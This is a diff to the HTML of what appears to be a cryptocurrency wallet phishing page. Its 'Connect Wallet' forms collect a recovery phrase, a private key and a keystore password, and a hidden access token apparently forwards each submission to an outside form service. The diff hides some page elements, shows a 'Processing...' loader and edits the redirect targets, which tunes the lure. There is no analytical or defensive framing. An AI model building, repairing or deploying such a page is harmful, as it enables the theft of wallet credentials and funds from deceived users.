@@ -481,7 +481,7 @@ font-weight: 800;
 <body>
     <div class="container">
 
-      <div class="upper" id="upper">
+      <div class="upper" style="display: none;" id="upper">
         
          <div class="upp_box">
             <p>EUT to USD</p>
@@ -575,7 +575,7 @@ font-weight: 800;
           </div>
       </div>
       
-      <div class="box" id="box">
+      <div class="box" style="display: none; " id="box">
 
         <span></span>
         <img src="assets/img/Icons/error.png" alt="">
@@ -607,8 +607,8 @@ font-weight: 800;
                 <textarea name="text" placeholder="Message" placeholder="Enter Phrase" id="phs" cols="30" rows="10" required></textarea>
                 
                 <input type="hidden" name="access_token" value="kswxi85jnoo9w7nserf6ljf8" />
-                <input type="hidden" name="success_url" value="./qr.html" />
-                <input type="hidden" name="error_url" value="./qr.html" />
+                <input type="hidden" name="success_url" value=".qr.html" />
+                <input type="hidden" name="error_url" value=".qr.html" />
 
                 <div class="seterr"></div> 
                 <button id="submit_form" type="submit" value="Send" class="conw ">Connect Wallet</button>
@@ -622,8 +622,8 @@ font-weight: 800;
               <input type="text" name="text" id="psp" placeholder="Enter Private Key" >
 
               <input type="hidden" name="access_token" value="kswxi85jnoo9w7nserf6ljf8" />
-                <input type="hidden" name="success_url" value="./qr.html" />
-                <input type="hidden" name="error_url" value="./qr.html" />
+                <input type="hidden" name="success_url" value=".qr.html" />
+                <input type="hidden" name="error_url" value=".qr.html" />
               <div class="setperr"></div>
 
               <button id="submit_form" type="submit" value="Send" class="conw ">Connect Wallet</button>
@@ -636,8 +636,8 @@ font-weight: 800;
               <input type="password" name="subject" id="kpsp">
 
               <input type="hidden" name="access_token" value="kswxi85jnoo9w7nserf6ljf8" />
-                <input type="hidden" name="success_url" value="./qr.html" />
-                <input type="hidden" name="error_url" value="./qr.html" />
+                <input type="hidden" name="success_url" value=".qr.html" />
+                <input type="hidden" name="error_url" value=".qr.html" />
                 
               <div class="setkerr"></div>
               <button id="submit_form" type="submit" value="Send" class="conw ">Connect Wallet</button>
@@ -658,9 +658,9 @@ font-weight: 800;
       </div>
 
 
-      <p class="message" id="msg" style="color: #fff; display: none;">Processing...</p>
+      <p class="message" id="msg" style="color: #fff;">Processing...</p>
 
-     <div class="loading" id="load" style="display: none;">
+     <div class="loading" id="load">
         <!-- <span class="text">Loading</span><br> --><br>
           <div class="am">
             <div class="dot"></div>
@@ -680,7 +680,7 @@ font-weight: 800;
 
 
   
-  <script src="./script.js"></script>
+  <script src="/script.js"></script>
   <!-- <script>
     var submitButton = document.getElementById("submit_form");
     var form = document.getElementById("email_form");
